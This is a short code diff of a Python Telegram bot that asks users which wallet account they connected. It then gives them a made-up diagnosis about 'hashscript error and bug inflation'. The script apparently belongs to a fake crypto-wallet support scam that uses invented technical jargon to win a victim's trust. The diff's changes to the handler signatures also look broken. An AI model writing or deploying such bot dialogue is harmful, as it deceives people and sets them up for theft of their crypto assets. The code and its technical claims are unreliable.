@@ -19,11 +19,11 @@ def start(update, context):
 
 @bot.message_handler(content_types=['text'])
 
-def first_question_step(message):
+def first_question_step(bot, message):
     msg = bot.send_message(message.chat.id, 'Which wallet account did you use to connect?')
     bot.register_next_step_handler(msg, second_step)
 
-def second_step(message):
+def second_step(bot, message):
     msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
 
 
